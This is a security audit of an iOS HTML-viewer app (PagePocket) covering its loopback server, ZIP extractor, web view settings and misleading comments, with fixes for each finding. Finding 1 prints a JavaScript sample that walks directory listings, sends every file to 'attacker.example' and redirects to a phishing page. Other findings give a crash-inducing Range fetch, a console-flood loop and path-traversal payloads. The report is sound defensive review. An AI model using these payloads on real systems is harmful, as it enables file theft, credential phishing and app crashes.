I read every source file and ran independent harnesses against the path resolver, the Range parser, and the ZIP extractor. Findings below; three are confirmed by execution, the rest by code reading with uncertainty flagged where it exists.

---

# A. VERIFIED-GOOD

These I actively tested or traced end-to-end and believe hold:

1. **Path traversal in `LocalHTTPServer.resolve(path:)` is genuinely blocked.** I extracted the resolver into a standalone harness against a real directory with a sibling `secret/` and tested `../`, `%2e%2e`, `..%2f`, `.%2e`, `%00..`, `%252e%252e`, `%c0%ae%c0%ae`, fullwidth `．．`, `//////`, and `%2Fetc%2Fpasswd`. Nothing escaped. Percent-decoding happens *before* the `..` check, so single-encoding is caught; double-encoding and overlong-UTF-8 forms land as literal (non-existent) filenames, not traversal. Absolute-looking paths (`%2F...`) are re-rooted under the mount because the decoded string is re-split and appended component-by-component.
2. **Symlink escape is blocked.** `resolvingSymlinksInPath()` is applied to the candidate *and* the root before the prefix check, and the check uses `rootPath + "/"` so `/root-evil` cannot match `/root`. A symlink inside the mount pointing at `/tmp/ppt/secret` returned 404 in my harness.
3. **Zip-slip is blocked.** I built archives with `../../escaped.html`, `a/../../escaped2.html`, `..\..\bs.html`, and absolute `/tmp/ziptest/absolute.html` and ran them through the real `ZipExtractor`. Traversal entries threw `unsafePath` and aborted the whole import (fail-closed, destination removed). The absolute path was neutralised into a relative one under the destination. Nothing was written outside the destination.
4. **The extractor never creates symlinks.** It ignores external attributes and writes every entry as a regular file, so the classic "symlink in zip → read anything" attack does not apply. `DocumentStore.copyContents` independently skips symlinks on folder import.
5. **The mount token is not guessable.** `UUID().uuidString` (122 bits of randomness) per `DocumentSession`; an unmounted token 404s. Brute force is not practical.
6. **Only one document is mounted at a time in the normal flow** — `.onDisappear { session.stop() }` unmounts. This meaningfully limits cross-document *file* reads.
7. **No HTTP response splitting / header injection.** No request-derived data reaches any response header; `Content-Type` comes from a static table.
8. **HTML escaping in the 404 page and directory listing is correct** for both text and double-quoted `href` contexts.
9. **No request smuggling.** Only GET/HEAD, no body is ever read, `Connection: close` plus `connection.cancel()` after every response.
10. **Header block is bounded** at 128 KB (`receiveRequest`, line 211).
11. **`GET http://evil.com/... HTTP/1.1` (absolute-form target) does not confuse the resolver** — it 404s.
12. **No untrusted data is interpolated into `evaluateJavaScript`.** Only an `Int` percentage in `PageSettingsView.applyTextZoom`.
13. **`TemporaryFiles.write` cannot be traversed** from the screenshot path — `/` is stripped from the title first (`DocumentBrowserView.swift:352`).
14. **App Group / entitlements are minimal** — one group, matched in both targets, no extra capabilities.

---

# B. FINDINGS

---

## 1. There is no egress control whatsoever — hostile HTML exfiltrates freely, and can replace itself with a remote site inside a chrome-less web view

**Severity: High**
**`PagePocket/Sources/Web/WebEngine.swift:459-491` (`policy(for:)`), `WebEngine.swift:53-83` (`init`)**

Two separate gaps compound:

**(a) Subresource loads are never policed at all.** `WKNavigationDelegate.decidePolicyFor` is only invoked for *navigations*. `fetch()`, `XMLHttpRequest`, `WebSocket`, `<img>`, `<script src>`, `sendBeacon` and Worker fetches never reach `policy(for:)`. There is no `WKContentRuleList`, no CSP header from the server, and `NSAppTransportSecurity` permits ordinary HTTPS. A page can POST anywhere.

**(b) Top-level navigation to the open web falls through to `.allow`.** The `.linkActivated` branch (line 484) only catches user-clicked links. A scripted `location.href = 'https://attacker.example/'` has `navigationType == .other` and hits `return .allow` on line 490. The web view then displays a fully remote site. There is no address bar anywhere in `DocumentBrowserView`; the navigation title is `session.displayTitle`, which is the page-controlled `<title>` (`DocumentSession.swift:62-65`), and the page can be pushed to true full-screen.

**Exploitation scenario.** The user imports `report.zip` from an email. `index.html` does:

```js
// enumerate the whole mount — the server hands out directory listings
async function walk(p, out=[]) {
  const html = await (await fetch(p)).text();
  for (const m of html.matchAll(/href="([^"]+)"/g)) {
    const h = m[1];
    h.endsWith('/') ? await walk(h, out) : out.push([h, await (await fetch(h)).text()]);
  }
  return out;
}
navigator.sendBeacon('https://attacker.example/x', JSON.stringify(await walk('./')));
setTimeout(() => location.href = 'https://attacker.example/icloud-signin', 400);
```

The first half steals every file in the document folder. This matters more than it sounds because `adoptLooseFiles` (`DocumentStore.swift:438`) adopts *any* folder the user drops into the Files-app-visible `Documents/` directory and mounts it whole — so a folder containing one HTML file plus unrelated personal documents serves all of them, and `directoryListing` (`LocalHTTPServer.swift:414`) enumerates them for the attacker. The second half then leaves a convincing credential-phishing page on screen with the attacker's own `<title>` in the navigation bar and no URL visible. `SingleFilePicker` (`DocumentPicker.swift:74`) uses `forOpeningContentTypes: [.item]`, so the same page can also offer a plausible "attach your file" button that opens the user's entire Files hierarchy and exfiltrate whatever they pick.

**Fix.** Decide the product policy first: if local documents should be network-isolated, enforce it in two places.

Server side, emit a CSP on every HTML response in `respond(to:on:)`:

```swift
var headers = [
    "HTTP/1.1 200 OK",
    "Content-Type: \(contentType)",
    "Content-Length: \(data.count)",
    "X-Content-Type-Options: nosniff",
    "Accept-Ranges: bytes",
    "Cache-Control: no-store, must-revalidate",
    "Connection: close"
]
if contentType.hasPrefix("text/html") || contentType.hasPrefix("application/xhtml") {
    headers.append(
        "Content-Security-Policy: default-src 'self' blob: data: 'unsafe-inline' 'unsafe-eval'; "
        + "connect-src 'self' blob: data:; frame-src 'self' blob: data:; "
        + "form-action 'self'; frame-ancestors 'self'"
    )
}
```

Client side, close the navigation fall-through:

```swift
// Anything that is not ours leaves the web view. Never render a remote page here.
externalURLRequest = url
return .cancel
```

(Keep the existing `about`/`data`/`blob` allowance above it.) If you want to permit CDN access, make it an explicit per-document opt-in toggle rather than the default, and belt-and-braces it with a `WKContentRuleList` that blocks everything except `127.0.0.1`.

---

## 2. Decompression bomb: an 800 KB ZIP produces 800 MB of RAM and 800 MB on disk — confirmed

**Severity: High**
**`PagePocket/Sources/Models/ZipExtractor.swift:63` and `170-193` (`inflate`), `extract` loop at `38-69`**

The comment on `inflate` says nothing about limits, and there are none: no cap on `expectedSize`, no ratio check against `compressedSize`, no running total across entries, no free-space check.

I ran the real `ZipExtractor` against an 815,556-byte archive containing one deflate entry:

```
EXTRACT OK
0.69 real   846,970,880 maximum resident set size
-rw-r--r--  838,860,800  out_bomb/bomb.bin
```

~1000:1 in both RAM and disk. On an iPhone, ~800 MB resident is past the jetsam limit on most devices — the app is killed mid-import. Scaling entry count (the EOCD entry count is a `UInt16`, so up to 65,535 entries) fills device storage instead; the loop writes each entry to disk fully with no cumulative budget.

Correction to a plausible-sounding variant of this bug: I also tested a hand-built archive whose central directory lies with `uncompressedSize = 0xFFFFFFFF`. `Data(count: 4_294_967_295)` reserves virtual address space but is lazily zero-filled, so RSS stayed at 7 MB and extraction succeeded. **The header lie alone is not sufficient** — the damage tracks the bytes actually inflated. Worth fixing anyway as a sanity check, but don't file it as the crash.

**Fix.** Budget both per-entry and total, and reject implausible ratios:

```swift
private static let maxEntrySize = 64 << 20          // 64 MB per file
private static let maxTotalSize: Int64 = 512 << 20  // 512 MB per archive
private static let maxRatio = 200                   // deflate ratio ceiling

// in extract(), before decompressing:
let declared = Int(entry.uncompressedSize)
guard declared <= maxEntrySize else { throw ZipError.tooLarge(entry.name) }
guard entry.compressedSize == 0 || declared / max(entry.compressedSize, 1) <= maxRatio else {
    throw ZipError.tooLarge(entry.name)
}
written += Int64(declared)
guard written <= maxTotalSize else { throw ZipError.tooLarge(entry.name) }
```

Also cap `entryCount` and stream to disk in chunks via `compression_stream_process` instead of allocating the whole output. The same budget should be applied to folder import (`copyContents`) and single-file import, which are likewise unbounded.

---

## 3. `Range: bytes=-N` against a zero-byte file traps the process — confirmed

**Severity: Medium**
**`PagePocket/Sources/Web/LocalHTTPServer.swift:379-383` (`parseRange`)**

```swift
if startText.isEmpty {
    guard let suffixLength = Int64(endText), suffixLength > 0 else { return nil }
    let start = max(0, fileSize - suffixLength)
    return start...(fileSize - 1)          // fileSize == 0  →  0...(-1)
}
```

With `fileSize == 0`, this forms `0...(-1)`. I compiled the function verbatim and ran it:

```
Swift/arm64e-apple-macos.swiftinterface:6292: Fatal error: Range requires lowerBound <= upperBound
exit=133   (SIGTRAP)
```

This is a Swift trap, not a catchable error, and it runs on the server's `DispatchQueue` — the whole app dies.

**Exploitation scenario.** Any imported document that contains a zero-byte file (trivially shipped in the attacker's own folder or zip, or created by `touch`-equivalent tooling) plus one line of JS:

```js
fetch('empty.txt', { headers: { Range: 'bytes=-1' } });
```

Instant, reliable app kill. Also reachable accidentally from a legitimate `<video>` element pointed at a truncated file.

The non-suffix branch is safe (`start < fileSize` rejects `fileSize == 0`), so only the suffix path is affected.

**Fix.**

```swift
guard fileSize > 0 else { return nil }   // add at the top of parseRange
```

Please add a unit test — the existing suite (`PagePocketTests.swift`) covers traversal but has no Range cases at all.

---

## 4. All documents share one origin *and* one persistent website data store

**Severity: Medium** (High when chained with finding 1)
**`PagePocket/Sources/Web/WebEngine.swift:53` (`WKWebViewConfiguration()` — `websiteDataStore` left at `.default()`), confirmed by `PageSettingsView.swift:97`**

The per-document random token protects *files*, but same-origin policy is scoped to `scheme://host:port` — not path. Every document served in a given app session is `http://127.0.0.1:<port>`, and every `WebEngine` uses `WKWebsiteDataStore.default()`. So `localStorage`, `sessionStorage`, IndexedDB, Cache Storage and cookies are one shared pool across all documents.

**Exploitation scenario.** The user keeps an AI-generated note-taking or budgeting HTML app that persists to `localStorage`. They later open a hostile `.html` from an email attachment. It reads `localStorage` and IndexedDB wholesale and ships it out via finding 1. It can also *write* — planting state that the legitimate document will read back and act on next time.

The app's only mitigation is a manual "Clear Cookies & Local Storage" button that wipes *everything* for *all* documents (`PageSettingsView.swift:96-107`).

**Open question I could not determine:** whether a page can register a Service Worker at scope `/` on this origin. If WKWebView permits it here (the app declares no `WKAppBoundDomains` and does not set `limitsNavigationsToAppBoundDomains`), a hostile document could install a worker that intercepts and rewrites *every subsequent document* loaded on that port — persistent cross-document script injection. This needs a 10-line on-device test (`navigator.serviceWorker.register('sw.js')` from an imported page, then check `navigator.serviceWorker.controller` from a second document) before you rely on either answer.

**Fix.** Give each `DocumentSession` its own data store, created in `WebEngine.init`:

```swift
configuration.websiteDataStore = .nonPersistent()
```

If per-document persistence is a feature you want, use `WKWebsiteDataStore(forIdentifier:)` (iOS 17+) keyed on `document.id` instead — that gives isolation *and* durability, and makes "Clear storage" a per-document action.

---

## 5. The console bridge is injected into every frame, including remote cross-origin ones

**Severity: Medium**
**`PagePocket/Sources/Web/WebEngine.swift:262` (`forMainFrameOnly: false`), `WebEngine.swift:80`, `WebEngine.swift:266-274`**

`configuration.userContentController.add(proxy, name: "pagePocketConsole")` registers on the whole `WKWebView`, and the bridge script is injected with `forMainFrameOnly: false`. Because finding 1 lets a document embed `<iframe src="https://attacker.example/">`, **an arbitrary remote origin gets a live native message handler**.

Today the handler's blast radius is small — `recordConsoleMessage` only appends to a SwiftUI list. But two concrete problems:

- **Unbounded memory.** The 500-message cap (line 271) bounds the *count*, not the size. Each `postMessage` body is an arbitrary-length string. `for(;;) console.log('A'.repeat(50e6))` pins 500 × 50 MB in native memory, plus floods the main actor with hops (each `recordConsoleMessage` mutates an `@Published` array, re-rendering the console view). Result: freeze, then jetsam.
- **Bridge hygiene.** Any future capability added to this handler is automatically exposed to whatever remote page a hostile document chooses to embed.

**Fix.** Scope the handler and bound the payload:

```swift
// Only the document's own top frame needs the bridge.
let script = WKUserScript(source: source, injectionTime: .atDocumentStart, forMainFrameOnly: true)

// In recordConsoleMessage:
let clipped = text.count > 4096 ? String(text.prefix(4096)) + "… (truncated)" : text
```

Additionally, check `message.frameInfo.securityOrigin` / `message.frameInfo.request.url` against the mount origin and drop anything else. Also consider coalescing: drop messages beyond ~50/second rather than hopping to the main actor per call.

---

## 6. Every served file is read fully into memory

**Severity: Medium**
**`PagePocket/Sources/Web/LocalHTTPServer.swift:324` (`handle.readToEnd()`), and `306` for ranged reads**

The comment on line 293 — *"HTML apps are small; a single read keeps this simple"* — is an assumption about content the threat model says is hostile. A 1.5 GB file inside an imported folder, requested once, allocates 1.5 GB in the app process plus the same again when it's copied into the response `Data` on line 359. The ranged path is no better: `Range: bytes=0-1500000000` reads the whole thing.

Note that `send(headers:body:)` concatenates headers and body into a *new* `Data`, so peak is roughly 2× file size.

**Exploitation scenario.** Hostile zip containing one large file (cheap to produce: 1 GB of zeros compresses to ~1 MB — though see finding 2, extraction dies first, so the practical vector is an imported *folder* containing a large video, or a bomb tuned to stay under whatever limit you add in finding 2). Then `fetch('big.bin')`. App killed.

**Fix.** Stream. Cap a single read at, say, 4 MB and send in chunks using `connection.send(..., completion: .contentProcessed { ... })` to drive the next read, and clamp `parseRange` lengths to that chunk size. At minimum, send headers separately from the body so you do not double-allocate.

---

## 7. Pending JavaScript-dialog and file-picker completion handlers are dropped

**Severity: Medium**
**`PagePocket/Sources/Views/DocumentBrowserView.swift:360-365` (`dialogBinding`), `WebEngine.swift:502-526`, `WebEngine.swift:541-546`**

```swift
private var dialogBinding: Binding<Bool> {
    Binding(
        get: { session.engine.activeDialog != nil },
        set: { if !$0 { session.engine.activeDialog = nil } }   // completion never called
    )
}
```

`WebEngine.cancelActiveDialog()` exists and does the right thing, but nothing calls it — the binding nils the dialog directly. Likewise, `activeDialog = .alert(...)` in the `WKUIDelegate` methods overwrites any pending dialog without resolving it, and `filePickerRequest = FilePickerRequest(...)` does the same.

Dropping a WebKit completion handler has two consequences: the page's `alert()`/`confirm()`/`prompt()` never returns (that frame hangs forever), and WebKit raises `NSInternalInconsistencyException: Completion handler passed to -[… runJavaScriptAlertPanelWithMessage:…] was not called` when the block deallocates — an uncaught ObjC exception, i.e. a crash.

**I could not confirm reachability on device.** The happy path (user taps a button) probably runs `resolveDialog` before SwiftUI clears the binding, and JS `alert()` is synchronous so a single frame cannot stack two. The plausible triggers are (a) two frames in *different* web content processes raising dialogs concurrently — reachable because finding 1 permits remote iframes, and (b) any SwiftUI-initiated dismissal. Treat this as "a real defect with a crash risk I could not prove", not a confirmed exploit.

Separately and **definitely broken**: the `.prompt` case (`DocumentBrowserView.swift:396-399`) has no `TextField` at all, so `promptBuffer` is always `""` and `window.prompt()` always returns the empty string on OK. The comment *"The text field is bound through the settings sheet to keep state simple"* describes something that does not exist.

**Fix.**

```swift
private var dialogBinding: Binding<Bool> {
    Binding(
        get: { session.engine.activeDialog != nil },
        set: { if !$0 { session.engine.cancelActiveDialog() } }
    )
}
```

In the `WKUIDelegate` methods, resolve any in-flight dialog before replacing it (`if activeDialog != nil { cancelActiveDialog() }`), do the same for `filePickerRequest`, and add `.onDisappear { session.engine.cancelActiveDialog() }`. Add the missing `TextField($promptBuffer)` to the alert's button builder.

---

## 8. `removeDuplicates()` reads every document's entry file into RAM at launch — and deletes folders on a 64-bit hash collision

**Severity: Medium (launch DoS) / Low (data loss)**
**`PagePocket/Sources/Models/DocumentStore.swift:76-104`, also `existingDocument(matching:)` at `277-278`**

`removeDuplicates()` runs from `init()` on every launch and calls `Data(contentsOf: document.entryURL)` for *every* document in the library, with no size guard. One 2 GB entry file in the library means the app OOMs during `DocumentStore.init` — **before any UI exists**, on every launch, permanently. The user cannot delete the offending document from inside the app; the only recovery is deleting it via the Files app or reinstalling.

Since `Documents/` is user-writable via `UIFileSharingEnabled` and `adoptLooseFiles` auto-imports whatever lands there, a large file arriving via iCloud Drive sync is enough — no attacker needed.

Secondly, the dedupe key is `"\(originalFileName)|\(data.count)|\(data.hashValue)"` and a match **deletes the folder** (line 91). `Data.hashValue` is a 64-bit SipHash. A collision on the same filename and same byte count destroys an unrelated document permanently. Low probability, unrecoverable outcome.

**Fix.** Compare file size from `resourceValues(forKeys: [.fileSizeKey])` first, skip anything over a few MB, and use a cryptographic digest rather than `hashValue`:

```swift
import CryptoKit
let digest = SHA256.hash(data: data)
let key = "\(document.originalFileName)|\(data.count)|\(digest)"
```

Better still: compute the digest once at import time and store it on `Document`, so launch does no I/O at all. And move `removeDuplicates()` off the init path so a failure cannot brick startup.

---

## 9. ZIP entries with an under-declared `uncompressedSize` are silently truncated

**Severity: Low**
**`PagePocket/Sources/Models/ZipExtractor.swift:170-193`**

`compression_decode_buffer` is given `expectedSize` as its destination capacity, taken straight from the central directory. If an archive declares `uncompressedSize = 1` for a 50 KB script, the call writes one byte, returns 1, `written > 0` passes, and a 1-byte file is written **with no error**. The archive content and the served content diverge, and the user sees a mysteriously broken page rather than a rejection.

Not memory-unsafe — `compression_decode_buffer` respects the destination bound — but the class of bug is "content the extractor writes is not the content the archive holds", which is worth closing.

**Fix.** Verify the CRC-32 from the central directory against the inflated bytes, and treat `written == expectedSize` with input remaining as an error. (You already read the header; you just discard the CRC field.)

---

## 10. ZIP: no Zip64 support, and local/central header disagreement is unchecked

**Severity: Low**
**`ZipExtractor.swift:104-146`, `149-165`**

- All sizes and offsets are `UInt32`. A Zip64 archive stores `0xFFFFFFFF` sentinels in these fields and the real values in the extra field, which is never parsed. The result is a garbage `localHeaderOffset` or `compressedSize` — bounds-checked, so it throws `truncated` rather than doing anything unsafe, but a legitimate >4 GB archive fails opaquely.
- `compressedPayload` deliberately uses the *local* header's `nameLength`/`extraLength` with the *central* header's `compressedSize`. The comment says this is intentional ("can differ"), which is true of real archives, but nothing checks that the local header's filename matches the central one. This is the standard ZIP-ambiguity primitive: a scanner reading local headers sees different names/contents than this extractor writes.

**Fix.** Detect the `0xFFFFFFFF` sentinel and either parse the Zip64 extra field or reject with a clear error. Compare the local header's filename bytes against the central entry's and reject mismatches.

---

## 11. `NSAllowsLocalNetworking` is redundant and broadens cleartext to the whole LAN

**Severity: Low**
**`PagePocket/Resources/Info.plist` — `NSAppTransportSecurity`**

The explicit `NSExceptionDomains` entries for `127.0.0.1` and `localhost` are exactly what the comment says they are, and they are sufficient for the loopback server. `NSAllowsLocalNetworking` additionally exempts unqualified hostnames and `.local` from ATS, which — given finding 1 — lets hostile HTML issue cleartext `fetch('http://router/...')` / `fetch('http://nas.local/...')` probes against the user's network.

Practical impact is limited: iOS 14+ gates actual local-network access behind the Local Network privacy permission, and the app declares no `NSLocalNetworkUsageDescription`, so those connections should be denied. I did not verify on device whether the WebKit networking process is subject to the same gate for the hosting app.

**Fix.** Delete `NSAllowsLocalNetworking`. The exception domains already cover the real requirement.

---

## 12. Document type claims are broader than the app's capability

**Severity: Low / Informational**
**`PagePocket/Resources/Info.plist` — `CFBundleDocumentTypes`**

- `com.pkware.zip-archive` with `LSHandlerRank: Owner` declares PagePocket the **owner of every ZIP file on the device**. Tapping any `.zip` in Files may route it into this app's ZIP parser (finding 2). `Alternate` is the correct rank here — the app is a viewer of *HTML bundles*, not the system's zip handler.
- `public.url` is listed as an owned type but is never handled anywhere in the import path (`importSingleFile` accepts only `html/htm/xhtml/svg`; `importItem` special-cases only `.zip`). A tapped `.url`/`.webloc` file will be accepted by the system and then fail with "that file type isn't supported".

**Fix.** Drop `public.url`. Change the ZIP entry's `LSHandlerRank` to `Alternate`.

---

## 13. `allowLocalEndpointReuse = true` on the listener

**Severity: Low — uncertain**
**`PagePocket/Sources/Web/LocalHTTPServer.swift:56`**

The port is kernel-assigned and ephemeral, so there is no reuse problem to solve. If this maps to `SO_REUSEPORT` (rather than only `SO_REUSEADDR`), another process on the device could bind the same port and receive a share of incoming connections — which would let it serve attacker-controlled content into PagePocket's web view at the trusted origin. **I could not determine which socket option Network.framework sets here**, and my reading of Darwin semantics is that two listeners on one TCP port need `SO_REUSEPORT` specifically, which `SO_REUSEADDR` alone does not grant. Low likelihood, but the flag buys nothing.

**Fix.** Remove the line.

---

## 14. Smaller server hardening gaps

**Severity: Low**
**`LocalHTTPServer.swift`**

- **No `X-Content-Type-Options: nosniff`** on any response (lines 307-315, 330-338, 346-352). Unknown extensions fall back to `application/octet-stream`; nosniff makes the intent binding.
- **No idle/read timeout and no connection cap.** `receiveRequest` (line 187) waits indefinitely and re-arms forever below the 128 KB ceiling. A co-resident process (loopback is not gated by the Local Network prompt) could hold thousands of half-open connections and exhaust file descriptors. Self-inflicted only; low priority.
- **Directory listings are always on.** Any page can recursively enumerate its entire document folder (see finding 1's scenario). Consider serving a plain 403 when `index.html` is absent, or gating listings behind a user setting.
- **Bare-LF requests parse incorrectly.** Header-end detection accepts `\n\n` (line 203) but `respond` splits on `\r\n` only (line 224), so an LF-only request collapses to a single "line" and the `Range` header lookup silently misses. Cosmetic, but the two parsers should agree.
- **`resolve` rejects `..` even when it stays inside the root** (`/r/T/sub/../index.html` → 404). Browsers normalise before sending so this rarely bites, but non-browser clients will see spurious 404s. Fail-closed, so leave it if you prefer — just know it is deliberate over-rejection, not correctness.

---

## 15. Loopback binding is not explicitly pinned — I could not verify it

**Severity: Informational**
**`PagePocket/Sources/Web/LocalHTTPServer.swift:53-58`**

```swift
parameters.requiredInterfaceType = .loopback
```

`requiredInterfaceType` is documented as a constraint on the interface used. Whether `NWListener` honours it as a *bind-address* restriction (`127.0.0.1`) or binds `INADDR_ANY` and filters afterwards, I could not establish from the documentation, and I have no device to test on. Three separate places assert this as a hard guarantee (see section C), so it deserves to be made explicit rather than inferred.

**Fix.** Pin the local endpoint directly, which is unambiguous:

```swift
parameters.requiredLocalEndpoint = NWEndpoint.hostPort(host: .ipv4(.loopback), port: .any)
parameters.requiredInterfaceType = .loopback   // keep both
```

And verify: with the app running, from another machine on the same Wi-Fi, `nc -vz <device-ip> <port>`. Worth adding to the CI/device checklist alongside the existing "server reported a listening port" log assertion.

---

# C. FALSE OR OVERSTATED CLAIMS

**1. `README.md:254` — the worst one.**

> *"PagePocket has **no network client**. It never fetches anything from the internet. The only server it talks to is itself, on `127.0.0.1`…"*

True of the Swift code. Completely false of the product. The app's entire purpose is hosting untrusted HTML in a `WKWebView` with an unrestricted networking stack, no CSP, no content rule list, and a navigation policy that returns `.allow` for scripted top-level navigation to any host (finding 1). A user reading this sentence would reasonably conclude that opening a hostile HTML file cannot leak anything. It can leak everything in the document folder, everything in shared `localStorage`, and any file they pick in a page-triggered file dialog.

**2. `LocalHTTPServer.swift:124-127`**

> *"Each document gets its own random token so one document cannot address another document's files by guessing a path."*

The literal claim (path guessing) is true — UUID tokens are not brute-forceable, and I confirmed unmounted tokens 404. But the sentence is phrased as document isolation, and documents are **not** isolated: they all share `http://127.0.0.1:<port>` as an origin and `WKWebsiteDataStore.default()` as a storage pool (finding 4). One document absolutely can read and write another's `localStorage`, IndexedDB and cookies. The comment should say what it actually guarantees: *"a random token prevents path-guessing between mounts; note that all documents still share a single web origin and therefore share web storage."*

**3. `LocalHTTPServer.swift:54`**

> *"Never leave the device: loopback only, no Wi-Fi, no cellular, no Bonjour."*

This describes what the *listener* accepts, which is plausible but which I could not verify (finding 15). It reads as a statement about the app as a whole, and in that reading it is wrong — data leaves the device freely via the web view.

**4. `LocalHTTPServer.swift:14-15`**

> *"The listener is restricted to the loopback interface and only ever serves files beneath a registered root, so nothing is exposed to the local network."*

The "only ever serves files beneath a registered root" half is **accurate and I verified it**. The "restricted to the loopback interface" half is the unverified assertion from finding 15.

**5. `PageSettingsView.swift:66` — user-facing, which makes it worse.**

> *"PagePocket serves this document over a loopback-only HTTP address … **Nothing is reachable from other devices.**"*

Same unverified premise, shown directly to the user as a privacy assurance. If the binding claim turns out to be true this sentence is fine in isolation — but next to a web view that can `fetch()` anywhere, users will read it as "this document cannot phone home". Reword to describe only the server: *"The local address is only reachable on this device. Pages you open can still access the internet."*

**6. `LocalHTTPServer.swift:157`**

> *"Reject traversal outright rather than trying to normalise it away."*

**Accurate.** Verified with fifteen encoding variants including double-encoding, overlong UTF-8, fullwidth, and null bytes. Noting it explicitly because you asked me to check the comments, and this one earns its keep.

**7. `LocalHTTPServer.swift:293-294`**

> *"HTML apps are small; a single read keeps this simple and lets us honour Range requests."*

The premise is a trusted-content assumption embedded in a comment on untrusted-content-handling code (finding 6). "HTML apps are small" is exactly the sentence an attacker reads as an invitation.

**8. `ZipExtractor.swift:45`**

> *"Reject absolute paths and traversal before touching the disk."*

**Accurate for traversal** (verified — throws `unsafePath` and aborts). Slightly loose on "reject absolute paths": absolute paths are not rejected, they are *stripped* by `sanitize` and re-rooted under the destination. My test confirmed `/tmp/ziptest/absolute.html` landed at `out_abs/tmp/ziptest/absolute.html`. Safe, but "reject" is the wrong verb and someone reading the comment would not expect the directory to be created.

**9. `DocumentBrowserView.swift:397**

> *"The text field is bound through the settings sheet to keep state simple."*

There is no such binding. `promptBuffer` is a `@State` that nothing ever writes; `window.prompt()` returns `""` unconditionally (finding 7).

**10. `DocumentSession.swift:55`**

> *"Releases the mount so no other document can address these files."*

Correct as far as it goes, but it is called only from `.onDisappear`. It does not run on app backgrounding, and the `WKWebView` for the departed document stays alive in memory with its page still executing — it just gets 404s. Fine; worth knowing the lifetime is view-driven, not session-driven.

---

# D. PRIORITISED ACTION LIST

1. **Add the one-line `guard fileSize > 0` to `parseRange`** (finding 3). Confirmed remote process trap, five-second fix, and it should have a regression test. Do this first purely on effort-to-impact.
2. **Decide and enforce the network-egress policy** (finding 1). Serve a `Content-Security-Policy` header on HTML responses and change `policy(for:)`'s fall-through from `.allow` to `.cancel` + `externalURLRequest`. This is the single largest gap against the stated threat model, and it is what makes findings 4, 5 and 14's directory listings materially dangerous rather than theoretical.
3. **Bound ZIP extraction** (finding 2) — per-entry cap, total cap, ratio ceiling, entry-count cap. Confirmed 1000:1 amplification.
4. **Isolate documents: `configuration.websiteDataStore = .nonPersistent()`** (finding 4), and run the Service Worker test to close the open question.
5. **Fix `removeDuplicates()`** (finding 8) — size guard plus SHA-256 instead of `hashValue`. A permanent launch crash with no in-app recovery is a support nightmare.
6. **Resolve dropped completion handlers**: point `dialogBinding` at `cancelActiveDialog()`, resolve before replacing, add the missing prompt `TextField` (finding 7).
7. **Scope the console bridge to the main frame and clip message length** (finding 5).
8. **Pin the listener's local endpoint explicitly and verify it off-device** (finding 15) — then the three comments and the user-facing footer in section C become true statements rather than assumptions.
9. **Stream file responses instead of `readToEnd()`** (finding 6).
10. **Correct the false claims** — `README.md:254` first, then `PageSettingsView.swift:66`, then the `LocalHTTPServer` and `DocumentBrowserView` comments (section C). A security claim that is wrong is worse than no claim.
11. **Info.plist cleanup**: drop `NSAllowsLocalNetworking`, drop `public.url`, demote the ZIP type to `Alternate` (findings 11, 12).
12. **Housekeeping**: `nosniff` header, remove `allowLocalEndpointReuse`, ZIP CRC verification and Zip64 sentinel detection, connection idle timeout, align the LF/CRLF request parsers (findings 9, 10, 13, 14).
